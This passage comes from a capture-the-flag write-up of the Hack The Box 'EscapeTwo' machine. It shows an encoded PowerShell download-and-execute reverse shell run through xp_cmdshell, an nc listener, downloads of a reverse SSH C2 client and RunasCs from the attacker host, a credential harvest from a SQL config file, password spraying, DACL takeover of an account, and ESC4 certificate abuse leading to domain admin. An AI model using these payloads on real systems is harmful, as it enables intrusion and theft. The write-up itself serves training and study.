C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -sta -NonI -w hidden -ep bypass -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADEALwByAGUAdgAuAHAAcwAxACcAKQAKAA==
```

```bash
rlwrap -cAr nc -lvnp 1111
```

```bash
SQL (-@master)> xp_cmdshell "powershell.exe -nop -sta -NonI -w hidden -ep bypass -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADEALwByAGUAdgAuAHAAcwAxACcAKQAKAA=="
username
--------
sa  dbo
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.181] from (UNKNOWN) [10.10.11.51] 50137
Windows PowerShell
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
sequel\sql_svc
```

Setup [reverse ssh](https://github.com/NHAS/reverse_ssh) client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ /opt/sectools/c2/reverse_ssh/bin/server --datadir /opt/sectools/c2/reverse_ssh/bin/ 0.0.0.0:443
2025/01/17 19:20:31 Loading files from /opt/sectools/c2/reverse_ssh/bin
2025/01/17 19:20:31 connect back:
2025/01/17 19:20:31 Version:  v2.6.8-8-g663d5d7
2025/01/17 19:20:31 Listening on 0.0.0.0:443
2025/01/17 19:20:31 Loading private key from: /opt/sectools/c2/reverse_ssh/bin/id_ed25519
[...]
```

```bash
PS C:\Windows\system32> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.181:80/client.exe', '\programdata\client.exe'); \programdata\client.exe
```

![](/assets/obsidian/d65412692d1bdfe241fe22917a030c16.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ ssh -J 127.0.0.1:443 sequel.sql_svc.dc01
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
sequel\sql_svc
```

## Shell as ryan


### Credential in mssql config file

```bash
PS C:\Windows\system32> (ls -Force \) 2>$null | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                       LastWriteTime         Length     FullName
----   -----                       -------------         ------     --------
d-----                             11/5/2022 12:03:50 PM            C:\PerfLogs
d--hs-                             6/8/2024 9:36:14 AM              C:\System Volume Information
d----- BUILTIN\Administrators      6/8/2024 3:07:24 PM              C:\SQL2019
d--hsl NT AUTHORITY\SYSTEM         6/8/2024 6:29:57 PM              C:\Documents and Settings
d--hs- BUILTIN\Administrators      6/8/2024 6:29:58 PM              C:\Recovery
d-r--- NT AUTHORITY\SYSTEM         6/9/2024 6:42:11 AM              C:\Users
d----- NT SERVICE\TrustedInstaller 6/9/2024 8:37:48 AM              C:\Program Files (x86)
d-r--- NT SERVICE\TrustedInstaller 1/4/2025 7:11:49 AM              C:\Program Files
d----- NT SERVICE\TrustedInstaller 1/4/2025 8:10:02 AM              C:\Windows
-a-hs-                             1/17/2025 1:15:12 AM  1476395008 C:\pagefile.sys
d--hs- NT AUTHORITY\SYSTEM         1/17/2025 1:23:42 AM             C:\$Recycle.Bin
d--h-- NT AUTHORITY\SYSTEM         1/17/2025 1:29:58 AM             C:\ProgramData
```

```bash
PS C:\Windows\system32> ls -Force -ErrorAction SilentlyContinue -Recurse C:\SQL2019 -File | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wr
ap
[...]
-a---- BUILTIN\Administrators 6/8/2024 3:07:00 PM         717 C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
-a---- BUILTIN\Administrators 6/8/2024 3:07:08 PM          16 C:\SQL2019\ExpressAdv_ENU\PackageId.dat
-a-h-- BUILTIN\Administrators 6/8/2024 3:07:24 PM       38166 C:\SQL2019\expradv_filelist_ENU.snp
```

- Got potential password of user `sa` for domain

```bash
PS C:\Windows\system32> cat C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

### 88 - Kerberos : Domain password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb -k $(pt get dc_fqdn) -u ldeep/_users_enabled.lst -p 'WqSZAF6CysDQbGb3' --continue-on-success
SMB         DC01.sequel.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3 KDC_ERR_PREAUTH_FAILED
```

### 5985 - winrm

Start **reverse ssh** client with **runascs** to gain access to **WMI**

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ pt set user 'ryan'; pt set pass 'WqSZAF6CysDQbGb3'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
ryan:WqSZAF6CysDQbGb3

┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ cat <(echo '$RSSH_FP="C:\\programdata\\client.exe"; if (!(Test-Path -PathType Leaf $RSSH_FP)) { (new-object System.Net.WebClient).DownloadFile("http://LHOST/client.exe", $RSSH_FP); }; iex (new-object net.webclient).DownloadString("http://LHOST/Invoke-RunasCs.ps1"); Invoke-RunasCs -BypassUac -LogonType 9 -Username "x" -Password "x" -Command "$RSSH_FP"; exit' | sed "s/LHOST/$(pt get lhost)/g") - | evil-winrm -i $(pt get ip) -u "$(pt get user)" -p "$(pt get pass)"

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

2025/01/17 03:09:49 Forking
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ ssh -J 127.0.0.1:443 sequel.ryan.dc01
Warning: Permanently added 'sequel.ryan.dc01' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
sequel\ryan
PS C:\Windows\system32> cat C:\Users\ryan\Desktop\user.txt
abeedd070132f5cf44b5d49dc96c0dfc
```


# Root Flag
---

## Auth as ca_svc


### User access check

- Bloodhound

![](/assets/obsidian/2e0fdb7d38b6b5284a89b9e95039b88d.png)

- SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
```

### DACL abuse - Write Owner

![](/assets/obsidian/c8d10fa889fd9f5548134f9552d5ac0c.png)

![](/assets/obsidian/cbdbfa42eb4e04d5044d28e07e42a2af.png)

Make `ryan` the new oner of `ca_svc`

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

Grant `ryan` **FullControl** rights to `ca_svc`

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
[*] DACL backed up to dacledit-20250117-192511.bak
[*] DACL modified successfully!
```

Force change password of `ca_svc`

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ net rpc password "ca_svc" 'Bravosec1337!' -U "$(pt get domain)"/"ryan"%'WqSZAF6CysDQbGb3' -S "$(pt get rhost)"
```

Confirmed that password of `ca_svc` was successfully changed

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ pt set user 'ca_svc'; pt set pass 'Bravosec1337!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
ca_svc:Bravosec1337!

┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:Bravosec1337!
```


## Shell as administrator


### ADCS attack - Misconfigured access controls (ESC4)

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ certipy find -u "$(pt get user)" -p "$(pt get pass)" -dc-ip $(pt get ip) -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

> Abuse ESC4 - https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4

![](/assets/obsidian/c67bca5a535dae147160b1089d283b89.png)

> Since **ACL** get resets by cleanup check script constantly, use a **one-liner** to change `ca_svc`'s password if permission denied error occured
> 
> ```bash
> owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'; dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'; net rpc password "ca_svc" 'Bravosec1337!' -U "$(pt get domain)"/"ryan"%'WqSZAF6CysDQbGb3' -S "$(pt get rhost)"
> ```
{: .prompt-tip }

1. Save the old configuration, edit the template and make it vulnerable

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ certipy template -u "$(pt get user)@$(pt get domain)" -p "$(pt get pass)" -dc-ip "$(pt get ip)" -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

2. Request a template certificate with a custom SAN

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ certipy req -u "$(pt get user)@$(pt get domain)" -p "$(pt get pass)" -dc-ip "$(pt get ip)" -target "$(pt get dc_fqdn)" -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'Administrator'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

3. After the attack, restore the original configuration

```bash
certipy req -u "$(pt get user)@$(pt get domain)" -p "$(pt get pass)" -dc-ip "$(pt get ip)" -template 'DunderMifflinAuthentication' -configuration 'DunderMifflinAuthentication.json'
```

### Pass the certificate

Request a TGT with the certificate

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ certipy auth -dc-ip "$(pt get ip)" -domain "$(pt get domain)" -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Pass the ticket

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ KRB5CCNAME="Administrator.ccache" nxc smb DC01.sequel.htb --use-kcache
SMB         DC01.sequel.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         DC01.sequel.htb 445    DC01             [+] sequel.htb\Administrator from ccache (Pwn3d!)
```

Start reverse ssh client

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ KRB5CCNAME="Administrator.ccache" nxc smb DC01.sequel.htb --use-kcache
SMB         DC01.sequel.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         DC01.sequel.htb 445    DC01             [+] sequel.htb\Administrator from ccache (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ ssh -J 127.0.0.1:443 sequel.administrator.dc01
Warning: Permanently added 'sequel.administrator.dc01' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> whoami
sequel\administrator
PS C:\> cat C:\users\Administrator\Desktop\root.txt
a12f6f512b77cee5d3f9f93faa472448
PS C:\>
```

# Additional
---
